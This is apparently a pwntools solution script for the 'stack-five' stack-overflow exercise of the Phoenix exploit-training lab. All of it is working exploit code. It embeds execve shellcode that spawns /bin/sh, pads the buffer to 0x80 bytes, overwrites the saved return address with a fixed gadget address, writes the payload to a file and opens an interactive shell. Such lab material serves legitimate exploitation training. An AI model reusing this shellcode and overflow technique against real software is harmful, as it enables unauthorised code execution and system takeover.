# correct (2023-12-05)
from pwn import *

context.log_level = "debug"

p = process("/opt/phoenix/amd64/stack-five")

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = b""
payload += shellcode
payload += b"A" * (0x80 - len(shellcode))
payload += 0x400481.to_bytes(8, 'little') * 2

with open("stack-five-pay.txt", "wb") as f:
    f.write(payload)

pause()
p.sendline(payload)
p.interactive()